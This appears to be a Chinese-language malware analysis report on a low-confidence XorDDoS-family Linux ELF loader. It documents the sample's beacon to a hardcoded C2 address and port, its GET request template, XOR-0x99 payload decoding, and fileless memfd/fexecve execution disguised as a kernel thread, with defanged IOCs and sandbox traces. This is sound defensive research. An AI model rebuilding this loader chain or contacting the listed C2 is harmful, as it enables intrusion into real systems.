---
title: "恶意样本分析：XorDDoS（ELF · elf · dcefe4cd）"
published: 2026-11-24
draft: false
description: "恶意（置信度低）：XorDDoS · loader/downloader · 难度 medium · 动态沙箱 + 静态反编译"
tags: ["XorDDoS", "loader", "downloader", "ELF"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **XorDDoS**（存疑） · 置信度 **低**
> 
> 别名：Linux/XOR.DDoS、XOR.DDoS
> 
> 静态反编译显示该 32 位 Linux ELF 具备完整的『回连—下载—内存执行』链：启动即用 access 检查 /tmp/log_de.log 单实例标记，向硬编码地址 8.140.232[.]67:8084 建连并发送 HTTP GET 注册信标，随后把响应体按 0x99 单字节异或解密后写入 memfd，再经 fexecve 以 [kworker/0:2] 名义内存执行后续载荷。隔离沙箱内真实运行观测到其反复尝试连接该 C2（ENETUNREACH 后每 10 秒重试），行为与正常软件不符。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **XorDDoS** · 别名 Linux/XOR.DDoS、XOR.DDoS · _存疑_ |
| 置信度 | **低** |
| 行为类 | loader · downloader |
| 难度 | medium |
| 首次出现 | 2026-11-22 02:27:41 |
| 分析方法 | 动态沙箱分析（Linux 样本）+ 静态反编译 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/dcefe4cd898825de4a262f455d742656a1c9eb61b404c51777652fd37c6d4f03/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="34" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">检查单实例标记</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1480</text>
<rect x="586" y="23" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="38" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">回连固定C2地址</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">发送HTTP注册信标</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">异或解密下载负载</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">memfd承载载荷</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1620</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `dcefe4cd898825de4a262f455d742656a1c9eb61b404c51777652fd37c6d4f03` |
| MD5 | _未记录_ |
| 大小 | 7,262 字节（7.1 KB） |
| 类型 | ELF · `elf` |

## 行为分析

共 **7** 条行为，每条都挂了证据；其中 **5** 条静态可得、**2** 条经动态分析取得。

### 1. 检查单实例标记

`T1480` · 置信度 **高** · 动态

启动后以 access 检查 /tmp/log_de.log 是否存在，存在即 exit(0)，用于避免重复运行而暴露自身。

> **证据**：main @0x80486e0 内 call access@0x8048707，路径串位于 0x8048ae0="/tmp/log_de.log"；动态追踪观察到 access("/tmp/log_de.log", F_OK) = ENOENT 后继续执行
> 
> **来源**：`ev-000002` · `ev-000010` · `ev-000018`

### 2. 回连固定C2地址

`T1071.001` · 置信度 **高** · 动态

以 socket/connect 连接硬编码的 8.140.232[.]67:8084，连接失败时 sleep(10) 无限重试，形成持久回连。

> **证据**：main @0x80487be call connect，sockaddr 端口字 0x941f（htons 后为 8084）；动态追踪 connect(3, {AF_INET, htons(8084), 8.140.232[.]67}) = ENETUNREACH，随后 clock_nanosleep 10s 再重试
> 
> **来源**：`ev-000002` · `ev-000016` · `ev-000017`

### 3. 发送HTTP注册信标

`T1071.001` · 置信度 **高** · 静态

连接成功后发送 GET /?a=l32&h=8.140.232[.]67&t=ws_&p=8084 的 HTTP/1.1 请求，并用 Windows Firefox 48 的 User-Agent 伪装流量。

> **证据**：rodata 0x8048b19 起为 "GET /?a=%s&h=%s&t=%s&p=%d HTTP/1.1…"，0x8048b15="l32"、0x8048b11="ws_"；main @0x804881b call send
> 
> **来源**：`ev-000001` · `ev-000002` · `ev-000018`

### 4. 异或解密下载负载

`T1027` · 置信度 **高** · 静态

对 C2 返回数据流的每个字节执行 ^0x99 解密，解密后写入内存文件描述符，为下一步执行做准备。

> **证据**：main @0x80486e0 反编译：recv 循环内 *pbVar11 ^= 0x99 后 write(fd, buf, n)；无独立密钥表，密钥为立即数
> 
> **来源**：`ev-000002`

### 5. memfd承载载荷

`T1620` · 置信度 **高** · 静态

调用 syscall(356)=memfd_create("a", MFD_CLOEXEC) 创建匿名内存文件并写入解密后的负载，避免在磁盘留下可执行文件。

> **证据**：main @0x80486e0：syscall(0x164, "a"@0x8048b9c, 1, …) 返回 fd，随后 write(fd, 解密缓冲, n)
> 
> **来源**：`ev-000002`

### 6. 伪装内核线程执行

`T1036.005` · 置信度 **高** · 静态

通过 fexecve 直接执行内存中的负载，argv[0] 设为 [kworker/0:2] 冒充内核线程，并把 CWD 环境变量设为样本自身真实路径以传递运行上下文。

> **证据**：main：realpath(*argv)→setenv("CWD", path, 1)；argv={"[kworker/0:2]"@0x8048b9e}；call fexecve(fd, argv, environ)
> 
> **来源**：`ev-000002`

### 7. 解析响应头再收负载

`T1071.001` · 置信度 **中** · 静态

逐字节接收 C2 响应并识别 \r\n\r\n 头部结束标志，随后进入负载接收循环。

> **证据**：main @0x804883a call recv；循环比较连续 0x0d/0x0a 四字节序列判定头部结束
> 
> **来源**：`ev-000002`


## IOC（已去武器化）

### 网络

:::caution
**待动态验证**：上述地址为静态分析所得，分析环境网络隔离下未观察到成功的连接或会话，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://8[.]140[.]232[.]67:8084/` | 8084 | c2 | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `/tmp/log_de.log`
- `/proc/self/exe（经 realpath(argv[0]) 取得，作为 CWD 环境变量下发）`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `8.140.232[.]67` | 是 | 静态 |
| `c2_port` | `8084` | 是 | 静态 |
| `c2_uri` | `/?a=%s&h=%s&t=%s&p=%d` | 是 | 静态 |
| `campaign_tag` | `a=l32, t=ws_` | 是 | 静态 |
| `user_agent` | `Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0` | 是 | 静态 |
| `encryption_algo` | `single-byte XOR，密钥 0x99（作用于 C2 返回的负载字节流）` | 是 | 静态 |
| `memfd_name` | `a` | 是 | 静态 |
| `masquerade_argv0` | `[kworker/0:2]` | 是 | 静态 |
| `singleton_path` | `/tmp/log_de.log` | 是 | 静态 |
| `reconnect_interval_sec` | `10` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不可断言该样本自身实施 DDoS 或窃密：它只负责回连与内存加载，实际危害取决于未获取的第二阶段载荷。
- 不可断言 C2 会话成功或负载已投递：分析窗口内的连接均因网络隔离返回 ENETUNREACH，未观察到任何 HTTP 请求/响应。
- 不可把 /tmp/log_de.log 视为样本自建文件：样本仅对其做存在性检查，未创建或写入该路径。
- 不可依据 0x99 异或就判定为勒索或挖矿：无文件加密、矿池或钱包相关特征。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 动态沙箱分析（Linux 样本）+ 静态反编译 |
| 脱壳 | 否 |

**局限与待验证**

1. 动态运行处于无网隔离环境，所有 connect 均返回 ENETUNREACH，未取得 C2 响应与第二阶段载荷，异或解密→memfd→fexecve 执行路径未被实际走到。
2. 缺少厂商引擎、YARA 与公开沙箱报告佐证，家族归因为行为特征推断，不是唯一结论。
3. 本次为 32 位 x86 Linux ELF，其他架构/变种未验证；样本依赖 libc.so.6 与 /lib/ld-linux.so.2。
4. /tmp/log_de.log 仅被存在性检查，创建者应为外部部署或后续阶段，未在本样本代码中出现。

## 证据索引

<details>
<summary>展开 8 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000001` | 字符串提取 | 抽取 111 条 ASCII 字符串，定位 /tmp/log_de.log、8.140.232[.]67、HTTP GET 模板与 User-Agent |
| `ev-000002` | decompile.function | 反编译 main @0x80486e0，还原单实例检查、回连、信标、XOR 0x99、memfd_create 与 fexecve 全链 |
| `ev-000003` | dyn.trace | 真实执行起始事件 execve("./prog") |
| `ev-000010` | dyn.trace | access("/tmp/log_de.log", F_OK) = ENOENT，确认单实例检查真实发生 |
| `ev-000015` | dyn.trace | socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3 |
| `ev-000016` | dyn.trace | connect(3, {AF_INET, htons(8084), 8.140.232[.]67}) = ENETUNREACH |
| `ev-000017` | dyn.trace | 10 秒后再次 connect 同一 C2，确认无限重连逻辑 |
| `ev-000018` | static.read | 十六进制核对 rodata：0x8048b11="ws_"、0x8048b15="l32"、0x8048b19=GET 模板、0x8048b9c="a"、0x8048b9e="[kworker/0:2]"；并复核 SHA-256 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
